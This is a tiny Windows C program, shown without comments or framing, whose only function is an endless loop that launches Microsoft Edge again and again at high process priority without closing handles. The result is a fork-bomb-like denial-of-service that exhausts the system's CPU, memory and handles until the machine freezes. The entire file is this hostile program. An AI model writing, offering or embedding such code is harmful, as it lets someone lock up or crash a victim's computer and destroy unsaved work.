#include <stdio.h>
#include <windows.h>

int main(void) {


	while(1==1){
	
		STARTUPINFOW si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
	
		CreateProcessW(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, FALSE, HIGH_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	
	}

	return 0;
}